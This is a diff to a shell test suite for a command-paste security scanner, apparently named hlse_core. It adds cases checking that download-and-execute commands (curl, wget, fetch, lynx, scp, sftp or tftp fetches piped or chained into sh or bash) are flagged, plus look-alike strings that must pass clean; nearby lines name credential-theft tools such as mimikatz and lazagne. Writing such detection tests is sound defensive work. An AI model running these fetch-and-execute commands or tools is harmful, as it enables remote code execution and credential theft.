@@ -11671,6 +11671,35 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-231: download-cradle completion (proc-sub + &&/; chain + more fetchers)
+for c in \
+    'bash <(curl http://x)' 'sh <(wget -qO- http://x)' 'zsh <(curl x)' \
+    'curl http://x > /tmp/x.sh && bash /tmp/x.sh' \
+    'curl -o s.sh http://x && sh s.sh' \
+    'wget http://x; sh x' \
+    'curl x && sudo bash s' \
+    'curl -o x http://y && chmod +x x && ./x' \
+    'wget s; chmod +x s' \
+    'curl http://x > s && ./s' \
+    'fetch -qo- http://x | sh' 'fetch http://x && bash x' \
+    'lynx -source http://x | sh' \
+    'scp h:s /tmp/s && bash /tmp/s' \
+    'sftp h:/s /tmp && sh /tmp/s' \
+    'tftp -i h get s && sh s'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "0" "0" \
+        || check "paste: $c flagged" "0" "1"
+done
+for c in 'cat <(curl x)' 'diff <(curl a) <(curl b)' \
+         'curl http://x && echo done' 'wget file && cat file' \
+         'curl -L x && mv x y' 'fetch the file' \
+         'scp file host:' 'scp file host: && echo ok' \
+         'sftp host' 'tftp -i h get s'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+        && check "paste FP guard: $c clean" "0" "0" \
+        || check "paste FP guard: $c clean" "0" "1"
+done
+
 # ── cycle-230b: attack-tool names + cloud/k8s/db primitives ──
 for c in \
     'mimikatz' 'lazagne all' 'pwdump' 'fgdump' 'bloodhound-python' \
